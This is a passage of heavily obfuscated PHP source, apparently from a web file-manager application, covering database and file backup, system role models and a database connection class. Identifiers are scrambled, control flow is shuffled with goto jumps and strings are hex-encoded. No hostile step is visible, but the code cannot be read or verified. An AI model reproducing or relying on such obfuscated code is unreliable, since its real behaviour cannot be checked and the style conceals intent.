C«¥ƒ÷Œ²; F‹ÇğÖ„‚: return !0; goto D¯ó‰Š†ñ; C«¥ƒ÷Œ²: $f½ÇØŞ„ =& $_SERVER[úÎü]; $cÎ‰Ö½ĞƒÇ = self::get(); if ($cÎ‰Ö½ĞƒÇ[$f½ÇØŞ„[287]][$f½ÇØŞ„[695]][$f½ÇØŞ„[690]] == $f½ÇØŞ„[83]) { return !0; } goto F®‘ùë¼°Ê; F®‘ùë¼°Ê: $eà‚ÎÓÅô = new BackupDb(); if (!$eà‚ÎÓÅô->index()) { return !1; } self::set(array($f½ÇØŞ„[707] => 1)); goto F‹ÇğÖ„‚; D¯ó‰Š†ñ: } public function dbFile() { goto cÓ²Ö˜…ó; cÓ²Ö˜…ó: $d¤áÛİçÃÖ =& $_SERVER[úÎü]; $fŒ÷¡¡ÇÀ = self::get(); if ($fŒ÷¡¡ÇÀ[$d¤áÛİçÃÖ[287]][$d¤áÛİçÃÖ[698]][$d¤áÛİçÃÖ[690]] == $d¤áÛİçÃÖ[83]) { return !0; } goto BÆµ‚³†ö; BÆµ‚³†ö: $D†Í£À¶ä = new BackupDbFile(); if (!$D†Í£À¶ä->index()) { return !1; } self::set(array($d¤áÛİçÃÖ[708] => 1)); goto E¥òøáëíä; E¥òøáëíä: return !0; goto EÃ—…ªƒêâ; EÃ—…ªƒêâ: } public function file() { $EªáÏ™áåÉ =& $_SERVER[úÎü]; $E½÷¡‰äŸŸ = self::get(); if ($E½÷¡‰äŸŸ[$EªáÏ™áåÉ[287]][$EªáÏ™áåÉ[171]][$EªáÏ™áåÉ[690]] == $EªáÏ™áåÉ[83]) { return !0; } if (!isset($E½÷¡‰äŸŸ[$EªáÏ™áåÉ[693]]) || $E½÷¡‰äŸŸ[$EªáÏ™áåÉ[693]] == $EªáÏ™áåÉ[485]) { $AÒ¿–¯§· = new BackupFile(); if (!$AÒ¿–¯§·->index()) { return !1; } } self::set(array($EªáÏ™áåÉ[709] => 1, $EªáÏ™áåÉ[690] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto D¹õÂğáÖœ; eÂŠ‰ö×óÜ: $cæâíæÖğ = array_diff($cæâíæÖğ, array($FííĞæÒ‹[711], $FííĞæÒ‹[712])); foreach ($cæâíæÖğ as $FÇÉÚŸ‹) { $dÏœ¾¹»¦‰ += $DÓÇ—»ÑÂ¿->model($FÇÉÚŸ‹)->count(); } $EÚó¶ïŠåƒ = new Task($FííĞæÒ‹[713], $FííĞæÒ‹[714], $dÏœ¾¹»¦‰, LNG($FííĞæÒ‹[715]) . $FííĞæÒ‹[716] . LNG($FííĞæÒ‹[717])); goto AÕ¹ì”áïã; C£ÈÏ¦ÅÏ: mk_dir($E×ƒ‰§Šøİ); $dÏœ¾¹»¦‰ = $AÅéÙÂöƒÁ = 0; try { $cæâíæÖğ = $DÓÇ—»ÑÂ¿->db()->getTables(); } catch (Exception $C„öÓ‰‰“„) { return !1; } goto eÂŠ‰ö×óÜ; F•Ü¯‡Ñã: Backup::set($b™óİ­®ĞÓ); if ($dÏœ¾¹»¦‰ > $AÅéÙÂöƒÁ) { return !1; } return !0; goto CÏ¹»¬Ë²µ; E–Î¯ùùœ: $DÓÇ—»ÑÂ¿ = new DbManage($eĞÃÀ™È˜, $eİ êÀµå); $E×ƒ‰§Šøİ = TEMP_FILES . $FííĞæÒ‹[710] . self::$name . $FííĞæÒ‹[8]; del_dir($E×ƒ‰§Šøİ); goto C£ÈÏ¦ÅÏ; D¹õÂğáÖœ: $FííĞæÒ‹ =& $_SERVER[úÎü]; $bÜ»‡Ëã = Backup::get(); self::$io = $bÜ»‡Ëã[$FííĞæÒ‹[692]]; goto e‡¢¶ñ•ö…; AÕ¹ì”áïã: foreach ($cæâíæÖğ as $FÇÉÚŸ‹) { $F„¦ºå­ŠÅ = $E×ƒ‰§Šøİ . $FÇÉÚŸ‹ . $FííĞæÒ‹[718]; $e‰İ¬Š‰øé = null; if ($FÇÉÚŸ‹ == $FííĞæÒ‹[719] && (!isset($bÜ»‡Ëã[$FííĞæÒ‹[693]]) || $bÜ»‡Ëã[$FííĞæÒ‹[693]] == $FííĞæÒ‹[485])) { $e‰İ¬Š‰øé = self::$io; } $AÅéÙÂöƒÁ += $DÓÇ—»ÑÂ¿->sqlFromDb($FÇÉÚŸ‹, $F„¦ºå­ŠÅ, $EÚó¶ïŠåƒ, $e‰İ¬Š‰øé); } $EÚó¶ïŠåƒ->end(); $b™óİ­®ĞÓ = array($FííĞæÒ‹[720] => $eİ êÀµå, $FííĞæÒ‹[707] => 1, $FííĞæÒ‹[721] => $dÏœ¾¹»¦‰ + 1, $FííĞæÒ‹[722] => $AÅéÙÂöƒÁ); goto F•Ü¯‡Ñã; e‡¢¶ñ•ö…: self::$name = $bÜ»‡Ëã[$FííĞæÒ‹[28]]; $eĞÃÀ™È˜ = $GLOBALS[$FííĞæÒ‹[6]][$FííĞæÒ‹[17]]; $eİ êÀµå = $this->_dbType($eĞÃÀ™È˜); goto E–Î¯ùùœ; CÏ¹»¬Ë²µ: } private function _dbType($f„ô„Ğºù) { goto fëøÂä¸; dèÑ¡É­—Ÿ: return $F‘¤Àç—ÒÓ; goto e„»åÃíŒ; dçÊ¾šÊŒ“: if ($F‘¤Àç—ÒÓ == $e¢æÉ×­Æ[724]) { $DãİÆÛªø¿ = explode($e¢æÉ×­Æ[4], $f„ô„Ğºù[$e¢æÉ×­Æ[725]]); $F‘¤Àç—ÒÓ = $DãİÆÛªø¿[0]; } $eÇˆ°…µÈ¹ = array($e¢æÉ×­Æ[726] => $e¢æÉ×­Æ[9], $e¢æÉ×­Æ[727] => $e¢æÉ×­Æ[728]); if (isset($eÇˆ°…µÈ¹[$F‘¤Àç—ÒÓ])) { $F‘¤Àç—ÒÓ = $eÇˆ°…µÈ¹[$F‘¤Àç—ÒÓ]; } goto dèÑ¡É­—Ÿ; fëøÂä¸: $e¢æÉ×­Æ =& $_SERVER[úÎü]; $f„ô„Ğºù = array_change_key_case($f„ô„Ğºù); $F‘¤Àç—ÒÓ = $f„ô„Ğºù[$e¢æÉ×­Æ[723]]; goto dçÊ¾šÊŒ“; e„»åÃíŒ: } } class BackupDbFile { public function __construct() { } public function index() { goto a‰ËïÏåİŠ; A¦“ê›Ï‘ù: $e¢Ï©Âª›ª->task[$d¼áÛ½®½Œ[699]] = $Fƒ¬ÔİãÈ…; foreach ($aß†°æÛÚó[$d¼áÛ½®½Œ[73]] as $DÛ£š²ßº¥) { $e·õíğÚ» = IO::move($DÛ£š²ßº¥[$d¼áÛ½®½Œ[75]], $D£ò·©ÍŞ¿); if (!$e·õíğÚ») { $e¢Ï©Âª›ª->end(); return !1; } } $a¤æÀİË¥ = CONTROLLER_DIR . $d¼áÛ½®½Œ[732]; goto Cö¨’ä“Œ; c™ù…©ò¦: $D’Œ®Ç„Ìù = TEMP_FILES . "\142\141\x63\x6b\x75\x70\137{$CìŠ…Ñ¸‹}\x2f"; $D£ò·©ÍŞ¿ = "\x7b\151\x6f\72{$D·ºÃĞò‹[$d¼áÛ½®½Œ[692]]}\x7d\57\144\x61\164\x61\142\x61\163\145\x2f\x62\141\x63\x6b\x75\x70\137{$CìŠ…Ñ¸‹}\57"; if (!($D£ò·©ÍŞ¿ = IO::mkdir($D£ò·©ÍŞ¿))) { return !1; } goto BñÄ×¦•£–; D–­’¡Ò´›: if (!$Fƒ¬ÔİãÈ…) { return !1; } Backup::set(array($d¼áÛ½®½Œ[729] => $Fƒ¬ÔİãÈ…)); $e¢Ï©Âª›ª = new TaskFileTransfer($d¼áÛ½®½Œ[730], $d¼áÛ½®½Œ[714], count($a¬æ“Ö…ôä), LNG($d¼áÛ½®½Œ[715]) . $d¼áÛ½®½Œ[428] . LNG($d¼áÛ½®½Œ[717]) . $d¼áÛ½®½Œ[731]); goto A¦“ê›Ï‘ù; BñÄ×¦•£–: $aß†°æÛÚó = IO::listPath($D’Œ®Ç„Ìù); $a¬æ“Ö…ôä = isset($aß†°æÛÚó[$d¼áÛ½®½Œ[73]]) ? $aß†°æÛÚó[$d¼áÛ½®½Œ[73]] : array(); $Fƒ¬ÔİãÈ… = array_sum(array_column($a¬æ“Ö…ôä, $d¼áÛ½®½Œ[77])); goto D–­’¡Ò´›; Cö¨’ä“Œ: $C÷¿Å‰æ›Ò = CONTROLLER_DIR . $d¼áÛ½®½Œ[733]; IO::copy($a¤æÀİË¥, $D£ò·©ÍŞ¿); IO::copy($C÷¿Å‰æ›Ò, $D£ò·©ÍŞ¿); goto EÁšÄ¬‡ê‹; a‰ËïÏåİŠ: $d¼áÛ½®½Œ =& $_SERVER[úÎü]; $D·ºÃĞò‹ = Backup::get(); $CìŠ…Ñ¸‹ = $D·ºÃĞò‹[$d¼áÛ½®½Œ[28]]; goto c™ù…©ò¦; EÁšÄ¬‡ê‹: $e¢Ï©Âª›ª->end(); Backup::set(array($d¼áÛ½®½Œ[734] => $Fƒ¬ÔİãÈ…)); return !0; goto fÕ×¤ÃôÃô; fÕ×¤ÃôÃô: } } goto aªµÉèÏß†; f±¡ª››½ñ: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\164\x65\x6d\x5f\157\160\x74\x69\x6f\156"; protected $jsonField = array("\x6d\x65\x6e\165", "\x72\157\154\x65", "\x72\157\x6c\x65\107\x72\157\x75\x70", "\x72\145\x67\151\x73\x74", "\x65\155\x61\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($c•×Š”›Ô“) { return "\x53\171\x73\x74\x65\x6d\117\160\x74\151\x6f\x6e\x5f{$c•×Š”›Ô“}"; } protected function optionDefault($F–Ã˜ñÅÜÀ = '') { $däÕÄÇè‡¶ =& $_SERVER[úÎü]; if ($F–Ã˜ñÅÜÀ == $däÕÄÇè‡¶[33]) { return $GLOBALS[$däÕÄÇè‡¶[6]][$däÕÄÇè‡¶[371]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\56\162\x6f\x6c\145\x4c\x69\163\x74"; public $field = array("\156\x61\155\145", "\x61\165\164\150", "\154\x61\x62\145\154", "\x64\x69\163\x70\x6c\x61\x79", "\163\171\163\x74\x65\x6d", "\x64\145\163\143", "\x69\147\x6e\x6f\162\x65\105\x78\x74", "\x69\147\156\157\162\145\106\x69\154\x65\x53\x69\172\145", "\141\144\155\x69\156\x69\x73\x74\162\x61\164\x6f\162", "\x73\157\x72\164"); public function listData($DºÈù÷Ì = false, $eÙ¦ªâ ãƒ = "\163\157\162\x74", $cÁààÏñ¢ = false) { $E„ÖĞ’êí =& $_SERVER[úÎü]; $F‚½õŠÂ¶× = parent::listData($DºÈù÷Ì, $eÙ¦ªâ ãƒ, $cÁààÏñ¢); if (!$DºÈù÷Ì) { $D«Ç¬„Ê = $E„ÖĞ’êí[2052]; foreach ($F‚½õŠÂ¶× as $b‡›¥Â¬ê’ => $FàÖÚ§ Šƒ) { if ($FàÖÚ§ Šƒ[$E„ÖĞ’êí[1835]] == 1) { $F‚½õŠÂ¶×[$b‡›¥Â¬ê’][$E„ÖĞ’êí[421]] = $D«Ç¬„Ê; } } } return $F‚½õŠÂ¶×; } public function update($EÀ©„èÚÄ, $F¹­‹ÃÑà¥) { goto aÂŠƒç†‹ë; dˆÁ÷˜•: return parent::update($EÀ©„èÚÄ, $F¹­‹ÃÑà¥); goto Bö˜¥ï÷; aÂŠƒç†‹ë: $d…‘Ïæ“¾‡ =& $_SERVER[úÎü]; $FÀ…‚õçœ = parent::listData($EÀ©„èÚÄ); $DÃÛ¹—ß = $this->findByName($F¹­‹ÃÑà¥[$d…‘Ïæ“¾‡[28]]); goto cäŞâ¤îÑ·; cäŞâ¤îÑ·: if (!$FÀ…‚õçœ || $DÃÛ¹—ß && $DÃÛ¹—ß[$d…‘Ïæ“¾‡[383]] != $FÀ…‚õçœ[$d…‘Ïæ“¾‡[383]]) { return !1; } if ($DÃÛ¹—ß[$d…‘Ïæ“¾‡[1835]] == 1) { $F¹­‹ÃÑà¥ = array($d…‘Ïæ“¾‡[28] => $F¹­‹ÃÑà¥[$d…‘Ïæ“¾‡[28]], $d…‘Ïæ“¾‡[1665] => $F¹­‹ÃÑà¥[$d…‘Ïæ“¾‡[1665]]); } $this->filterAuth($F¹­‹ÃÑà¥[$d…‘Ïæ“¾‡[392]]); goto dˆÁ÷˜•; Bö˜¥ï÷: } public function remove($AË¹©Î¡´) { $eÁƒè‚Ø´Ê = parent::listData($AË¹©Î¡´); if (!$eÁƒè‚Ø´Ê || $eÁƒè‚Ø´Ê[$_SERVER[úÎü][1126]]) { return !1; } return parent::remove($AË¹©Î¡´); } public function add($bóÆ¶·Õµ‚) { goto A†µâ÷Ì½º; eÑ¢ÛğùÀ: return parent::insert($bóÆ¶·Õµ‚); goto B†Ê…®·…Ÿ; Cƒò‡©éŒ: $Eç‰ÕÊÕ‰ˆ = array($d¨äèÍÌÕ[402] => $eÖïÄšù“¥, $d¨äèÍÌÕ[1650] => $d¨äèÍÌÕ[33], $d¨äèÍÌÕ[1646] => $d¨äèÍÌÕ[1654], $d¨äèÍÌÕ[2053] => 1, $d¨äèÍÌÕ[1649] => 0, $d¨äèÍÌÕ[2054] => 0, $d¨äèÍÌÕ[1648] => $this->getSort()); $bóÆ¶·Õµ‚ = array_merge($Eç‰ÕÊÕ‰ˆ, $bóÆ¶·Õµ‚); $this->filterAuth($bóÆ¶·Õµ‚[$d¨äèÍÌÕ[392]]); goto eÑ¢ÛğùÀ; A†µâ÷Ì½º: $d¨äèÍÌÕ =& $_SERVER[úÎü]; $eÖïÄšù“¥ = $bóÆ¶·Õµ‚[$d¨äèÍÌÕ[28]]; if ($this->findByName($eÖïÄšù“¥)) { return !1; } goto Cƒò‡©éŒ; B†Ê…®·…Ÿ: } private function getSort() { $d××«©‘“¼ =& $_SERVER[úÎü]; $e›ËëİÜŞ = parent::listData(); $EÚÔµİÑ®á = array_to_keyvalue($e›ËëİÜŞ, $d××«©‘“¼[33], $d××«©‘“¼[1667]); return empty($EÚÔµİÑ®á) ? 0 : max($EÚÔµİÑ®á) + 1; } private function filterAuth(&$E„É©¨ ) { $d›„†Íâ› =& $_SERVER[úÎü]; $f„œŸ»Ë¿ = array(); $DÁ†ÌÑ®©Œ = array_filter(explode($d›„†Íâ›[47], $E„É©¨ )); foreach ($DÁ†ÌÑ®©Œ as $E„É©¨ ) { $fø£¯œèÁã = explode($d›„†Íâ›[91], $E„É©¨ ); if ($fø£¯œèÁã[0] == $d›„†Íâ›[2055] && $fø£¯œèÁã[1] != $d›„†Íâ›[1050]) { $BÇ…¥†À‡Ó = $fø£¯œèÁã[0] . $d›„†Íâ›[91] . $fø£¯œèÁã[1] . $d›„†Íâ›[2056]; if (!in_array($BÇ…¥†À‡Ó, $DÁ†ÌÑ®©Œ)) { $f„œŸ»Ë¿[] = $BÇ…¥†À‡Ó; } } $f„œŸ»Ë¿[] = $E„É©¨ ; } $E„É©¨  = implode($d›„†Íâ›[47], $f„œŸ»Ë¿); } public function sort($Cƒñ·›ø§´, $eÖíË¯÷è) { return parent::update($Cƒñ·›ø§´, $eÖíË¯÷è); } } goto B×·†ìíôÜ; EÙ³ö‘ÖÍœ: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\x69\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\x3d", "\x6e\145\161" => "\74\x3e", "\147\x74" => "\x3e", "\x65\147\164" => "\76\x3d", "\154\164" => "\x3c", "\145\154\164" => "\x3c\x3d", "\156\x6f\x74\x6c\x69\153\145" => "\x4e\117\x54\x20\114\111\x4b\105", "\x6c\x69\153\145" => "\x4c\111\113\105", "\151\x6e" => "\x49\x4e", "\x6e\x6f\164\x69\156" => "\116\x4f\124\x20\x49\116", "\x6e\157\164\x20\x69\156" => "\x4e\117\x54\x20\111\116", "\x62\x65\164\167\x65\x65\x6e" => "\x42\x45\124\127\x45\105\116", "\156\x6f\164\x62\x65\x74\x77\x65\x65\156" => "\x4e\117\x54\40\x42\x45\124\x57\105\x45\116", "\156\157\x74\x20\x62\145\x74\167\145\x65\156" => "\116\x4f\x54\40\x42\x45\x54\127\x45\105\116"); protected $selectSql = "\123\x45\x4c\x45\x43\x54\45\104\x49\123\124\x49\x4e\x43\124\45\40\45\x46\x49\x45\x4c\x44\45\40\106\122\117\x4d\x20\45\x54\x41\x42\114\105\45\x25\x4a\117\111\116\x25\x25\x57\110\105\122\x45\x25\45\107\122\117\125\x50\x25\x25\110\x41\x56\111\116\107\45\45\117\x52\104\105\x52\x25\45\x4c\111\115\111\124\45\40\45\x55\116\111\x4f\x4e\45\x25\x43\117\115\115\x45\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $CğÆÒªô¼å = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[úÎü][880], $CğÆÒªô¼å); } public function factory($c½£‡Æ´Ø‰ = '') { goto b…òÖ·£Õ; E¦¯Åâé: return $cƒÃÍÉèÁª; goto CíÑ†İ±Ÿ‡; eÁÑğåÊŞœ: $this->dbType = ucwords(strtolower($c½£‡Æ´Ø‰[$B…Ù“ÜÙŞ¹[881]])); $f¢ê‹ÖªÖ = $B…Ù“ÜÙŞ¹[883] . $this->dbType; if (class_exists($f¢ê‹ÖªÖ)) { $cƒÃÍÉèÁª = new $f¢ê‹ÖªÖ($c½£‡Æ´Ø‰); if ($B…Ù“ÜÙŞ¹[724] != strtolower($c½£‡Æ´Ø‰[$B…Ù“ÜÙŞ¹[881]])) { $cƒÃÍÉèÁª->dbType = strtoupper($this->dbType); } else { $cƒÃÍÉèÁª->dbType = $this->_getDsnType($c½£‡Æ´Ø‰[$B…Ù“ÜÙŞ¹[836]]); } } else { think_exception(think_lang($B…Ù“ÜÙŞ¹[884]) . $B…Ù“ÜÙŞ¹[885] . $f¢ê‹ÖªÖ); } goto E¦¯Åâé; b…òÖ·£Õ: $B…Ù“ÜÙŞ¹ =& $_SERVER[úÎü]; $c½£‡Æ´Ø‰ = $this->parseConfig($c½£‡Æ´Ø‰); if (empty($c½£‡Æ´Ø‰[$B…Ù“ÜÙŞ¹[881]])) { think_exception(think_lang($B…Ù“ÜÙŞ¹[882])); } goto eÁÑğåÊŞœ; CíÑ†İ±Ÿ‡: } public function __call($E‹ëÌ‡± ã, $f¯‚÷çàª­) { if (method_exists($this, $E‹ëÌ‡± ã)) { return call_user_func_array(array($this, $E‹ëÌ‡± ã), $f¯‚÷çàª­); } } protected function _getDsnType($d¹ã»ò·) { $C¼Öåœª„ã = explode($_SERVER[úÎü][4], $d¹ã»ò·); $aÙğ¹—·ó× = strtoupper(trim($C¼Öåœª„ã[0])); return $aÙğ¹—·ó×; } private function parseConfig($b›¯¼íß = '') { $CÓ·›‹ ¯ =& $_SERVER[úÎü]; if (!empty($b›¯¼íß) && is_string($b›¯¼íß)) { $b›¯¼íß = $this->parseDSN($b›¯¼íß); } elseif (is_array($b›¯¼íß)) { $b›¯¼íß = array_change_key_case($b›¯¼íß); $b›¯¼íß = array($CÓ·›‹ ¯[881] => $b›¯¼íß[$CÓ·›‹ ¯[723]], $CÓ·›‹ ¯[807] => $b›¯¼íß[$CÓ·›‹ ¯[886]], $CÓ·›‹ ¯[808] => $b›¯¼íß[$CÓ·›‹ ¯[887]], $CÓ·›‹ ¯[805] => $b›¯¼íß[$CÓ·›‹ ¯[888]], $CÓ·›‹ ¯[806] => $b›¯¼íß[$CÓ·›‹ ¯[889]], $CÓ·›‹ ¯[17] => $b›¯¼íß[$CÓ·›‹ ¯[890]], $CÓ·›‹ ¯[836] => $b›¯¼íß[$CÓ·›‹ ¯[725]], $CÓ·›‹ ¯[13] => isset($b›¯¼íß[$CÓ·›‹ ¯[891]]) ? $b›¯¼íß[$CÓ·›‹ ¯[891]] : array()); } elseif (empty($b›¯¼íß)) { if (think_config($CÓ·›‹ ¯[892]) && $CÓ·›‹ ¯[724] != strtolower(think_config($CÓ·›‹ ¯[893]))) { $b›¯¼íß = $this->parseDSN(think_config($CÓ·›‹ ¯[892])); } else { $b›¯¼íß = array($CÓ·›‹ ¯[881] => think_config($CÓ·›‹ ¯[893]), $CÓ·›‹ ¯[807] => think_config($CÓ·›‹ ¯[894]), $CÓ·›‹ ¯[808] => think_config($CÓ·›‹ ¯[895]), $CÓ·›‹ ¯[805] => think_config($CÓ·›‹ ¯[896]), $CÓ·›‹ ¯[806] => think_config($CÓ·›‹ ¯[897]), $CÓ·›‹ ¯[17] => think_config($CÓ·›‹ ¯[240]), $CÓ·›‹ ¯[836] => think_config($CÓ·›‹ ¯[892]), $CÓ·›‹ ¯[13] => think_config($CÓ·›‹ ¯[898])); } } return $b›¯¼íß; } protected function initConnect($b˜­æø†ó = true) { if (1 == think_config($_SERVER[úÎü][18])) { $this->_linkID = $this->multiConnect($b˜­æø†ó); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $C»‰ÁŒÉ—  => $BŠÂóğ®) { $this->_linkID = $BŠÂóğ®; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($E‡ÚÉìéô = false) { $Cï¶Äôå• =& $_SERVER[úÎü]; static $D®è”İ²äÑ = array(); if (empty($D®è”İ²äÑ)) { foreach ($this->config as $fƒà†ˆÁ²® => $f¯ùÉ²†…) { $D®è”İ²äÑ[$fƒà†ˆÁ²®] = explode($Cï¶Äôå•[47], $f¯ùÉ²†…); } } if (think_config($Cï¶Äôå•[899])) { if ($E‡ÚÉìéô) { $eè¸¹…ïÖ¢ = floor(mt_rand(0, think_config($Cï¶Äôå•[900]) - 1)); } else { if (is_numeric(think_config($Cï¶Äôå•[901]))) { $eè¸¹…ïÖ¢ = think_config($Cï¶Äôå•[901]); } else { $eè¸¹…ïÖ¢ = floor(mt_rand(think_config($Cï¶Äôå•[900]), count($D®è”İ²äÑ[$Cï¶Äôå•[805]]) - 1)); } } } else { $eè¸¹…ïÖ¢ = floor(mt_rand(0, count($D®è”İ²äÑ[$Cï¶Äôå•[805]]) - 1)); } $c·‘ÎÁ Ï = array($Cï¶Äôå•[807] => isset($D®è”İ²äÑ[$Cï¶Äôå•[807]][$eè¸¹…ïÖ¢]) ? $D®è”İ²äÑ[$Cï¶Äôå•[807]][$eè¸¹…ïÖ¢] : $D®è”İ²äÑ[$Cï¶Äôå•[807]][0], $Cï¶Äôå•[808] => isset($D®è”İ²äÑ[$Cï¶Äôå•[808]][$eè¸¹…ïÖ¢]) ? $D®è”İ²äÑ[$Cï¶Äôå•[808]][$eè¸¹…ïÖ¢] : $D®è”İ²äÑ[$Cï¶Äôå•[808]][0], $Cï¶Äôå•[805] => isset($D®è”İ²äÑ[$Cï¶Äôå•[805]][$eè¸¹…ïÖ¢]) ? $D®è”İ²äÑ[$Cï¶Äôå•[805]][$eè¸¹…ïÖ¢] : $D®è”İ²äÑ[$Cï¶Äôå•[805]][0], $Cï¶Äôå•[806] => isset($D®è”İ²äÑ[$Cï¶Äôå•[806]][$eè¸¹…ïÖ¢]) ? $D®è”İ²äÑ[$Cï¶Äôå•[806]][$eè¸¹…ïÖ¢] : $D®è”İ²äÑ[$Cï¶Äôå•[806]][0], $Cï¶Äôå•[17] => isset($D®è”İ²äÑ[$Cï¶Äôå•[17]][$eè¸¹…ïÖ¢]) ? $D®è”İ²äÑ[$Cï¶Äôå•[17]][$eè¸¹…ïÖ¢] : $D®è”İ²äÑ[$Cï¶Äôå•[17]][0], $Cï¶Äôå•[836] => isset($D®è”İ²äÑ[$Cï¶Äôå•[836]][$eè¸¹…ïÖ¢]) ? $D®è”İ²äÑ[$Cï¶Äôå•[836]][$eè¸¹…ïÖ¢] : $D®è”İ²äÑ[$Cï¶Äôå•[836]][0], $Cï¶Äôå•[13] => isset($D®è”İ²äÑ[$Cï¶Äôå•[13]][$eè¸¹…ïÖ¢]) ? $D®è”İ²äÑ[$Cï¶Äôå•[13]][$eè¸¹…ïÖ¢] : $D®è”İ²äÑ[$Cï¶Äôå•[13]][0]); return $this->connect($c·‘ÎÁ Ï, $eè¸¹…ïÖ¢); } public function parseDSN($Eê‚Øé“Ÿå) { $D¶éä‰ Í§ =& $_SERVER[úÎü]; if (empty($Eê‚Øé“Ÿå)) { return !1; } $Fç•“îÏÉ³ = parse_url($Eê‚Øé“Ÿå); if ($Fç•“îÏÉ³[$D¶éä‰ Í§[172]]) { $B…ëÖÆ¤• = array($D¶éä‰ Í§[881] => $Fç•“îÏÉ³[$D¶éä‰ Í§[172]], $D¶éä‰ Í§[807] => isset($Fç•“îÏÉ³[$D¶éä‰ Í§[551]]) ? $Fç•“îÏÉ³[$D¶éä‰ Í§[551]] : $D¶éä‰ Í§[33], $D¶éä‰ Í§[808] => isset($Fç•“îÏÉ³[$D¶éä‰ Í§[902]]) ? $Fç•“îÏÉ³[$D¶éä‰ Í§[902]] : $D¶éä‰ Í§[33], $D¶éä‰ Í§[805] => isset($Fç•“îÏÉ³[$D¶éä‰ Í§[173]]) ? $Fç•“îÏÉ³[$D¶éä‰ Í§[173]] : $D¶éä‰ Í§[33], $D¶éä‰ Í§[806] => isset($Fç•“îÏÉ³[$D¶éä‰ Í§[174]]) ? $Fç•“îÏÉ³[$D¶éä‰ Í§[174]] : $D¶éä‰ Í§[33], $D¶éä‰ Í§[17] => isset($Fç•“îÏÉ³[$D¶éä‰ Í§[75]]) ? substr($Fç•“îÏÉ³[$D¶éä‰ Í§[75]], 1) : $D¶éä‰ Í§[33]); } else { preg_match($D¶éä‰ Í§[903], trim($Eê‚Øé“Ÿå), $A÷¡„š÷êÉ); $B…ëÖÆ¤• = array($D¶éä‰ Í§[881] => $A÷¡„š÷êÉ[1], $D¶éä‰ Í§[807] => $A÷¡„š÷êÉ[2], $D¶éä‰ Í§[808] => $A÷¡„š÷êÉ[3], $D¶éä‰ Í§[805] => $A÷¡„š÷êÉ[4], $D¶éä‰ Í§[806] => $A÷¡„š÷êÉ[5], $D¶éä‰ Í§[17] => $A÷¡„š÷êÉ[6]); } $B…ëÖÆ¤•[$D¶éä‰ Í§[836]] = $D¶éä‰ Í§[33]; return $B…ëÖÆ¤•; } protected function debug() { $A¿ó—¡Š±¼ =& $_SERVER[úÎü]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $A¿ó—¡Š±¼[904]; if (think_config($A¿ó—¡Š±¼[905])) { think_status($A¿ó—¡Š±¼[906]); think_trace($this->queryStr . $A¿ó—¡Š±¼[907] . think_status($A¿ó—¡Š±¼[20], $A¿ó—¡Š±¼[906], 6) . $A¿ó—¡Š±¼[908], $A¿ó—¡Š±¼[33], $A¿ó—¡Š±¼[909]); } } protected function parseLock($d‹ªÀƒÍ“ù = false) { $BáÅÕ»¤ª˜ =& $_SERVER[úÎü]; if (!$d‹ªÀƒÍ“ù) { return $BáÅÕ»¤ª˜[33]; } if ($BáÅÕ»¤ª˜[838] == $this->dbType) { return $BáÅÕ»¤ª˜[910]; } return $BáÅÕ»¤ª˜[911]; } protected function parseSet($Dƒ· ©’¤) { $Dù¾³‹ÛÒ­ =& $_SERVER[úÎü]; foreach ($Dƒ· ©’¤ as $EØ¦’Å…Ì» => $f—´ÂŒ”…) { if (is_array($f—´ÂŒ”…) && $Dù¾³‹ÛÒ­[291] == $f—´ÂŒ”…[0]) { $d¼—¥­íÀó[] = $this->parseKey($EØ¦’Å…Ì») . $Dù¾³‹ÛÒ­[912] . $f—´ÂŒ”…[1]; } elseif (is_scalar($f—´ÂŒ”…) || is_null($f—´ÂŒ”…)) { $d¼—¥­íÀó[] = $this->parseKey($EØ¦’Å…Ì») . $Dù¾³‹ÛÒ­[912] . $this->parseValue($f—´ÂŒ”…); } } return $Dù¾³‹ÛÒ­[913] . implode($Dù¾³‹ÛÒ­[47], $d¼—¥­íÀó); } protected function bindParam($Aé«å’İÓÛ, $CÖ°¹›¡…•) { $this->bind[$_SERVER[úÎü][4] . $Aé«å’İÓÛ] = $CÖ°¹›¡…•; } protected function parseBind($a»ƒ¤¹ÉÛ•) { $a»ƒ¤¹ÉÛ• = array_merge($this->bind, $a»ƒ¤¹ÉÛ•); $this->bind = array(); return $a»ƒ¤¹ÉÛ•; } function parseKey(&$cçª‹¾Ó, $Dğâ£•Ä = true) { if ($Dğâ£•Ä) { $cçª‹¾Ó = $this->parseKeyCheck($cçª‹¾Ó); } return $cçª‹¾Ó; } function parseKeyCheck($Bˆ£¡¬äˆç) { $CŒòÃÂ§ö„ =& $_SERVER[úÎü]; $Bˆ£¡¬äˆç = trim($Bˆ£¡¬äˆç); if (!preg_match($CŒòÃÂ§ö„[914], $Bˆ£¡¬äˆç)) { think_exception($CŒòÃÂ§ö„[915] . $Bˆ£¡¬äˆç); } return $Bˆ£¡¬äˆç; } protected function parseValue($b´®¤­¡´) { $båˆå‘Ğ•Æ =& $_SERVER[úÎü]; if (is_string($b´®¤­¡´)) { $b´®¤­¡´ = $båˆå‘Ğ•Æ[877] . $this->escapeString($b´®¤­¡´) . $båˆå‘Ğ•Æ[877]; } elseif (isset($b´®¤­¡´[0]) && is_string($b´®¤­¡´[0]) && strtolower($b´®¤­¡´[0]) == $båˆå‘Ğ•Æ[291]) { $b´®¤­¡´ = $this->escapeString($b´®¤­¡´[1]); } elseif (is_array($b´®¤­¡´)) { 